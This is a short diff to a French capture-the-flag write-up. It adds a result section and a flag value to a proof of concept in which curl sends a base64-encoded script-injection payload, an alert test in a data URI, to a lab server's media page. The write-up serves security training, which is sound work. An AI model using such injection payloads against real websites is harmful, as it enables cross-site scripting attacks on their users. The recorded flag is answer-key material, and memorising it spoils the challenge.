@@ -27,5 +27,10 @@ L'attaque a été réalisée via `curl` pour vérifier la réponse du serveur :
 curl -sG "[http://192.168.222.135/index.php](http://192.168.222.135/index.php)" \
 --data-urlencode "page=media" \
 --data-urlencode "src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | findstr "flag"
+```
+### Résultat
+Le serveur exécute le script injecté et révèle le flag de validation dans le terminal.
 
-![Page Media NSA](screenshot/Preuve de Concept (PoC).png)
+![Preuve du Flag avec curl](screenshot/poc.png)
+
+**Flag :** `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`
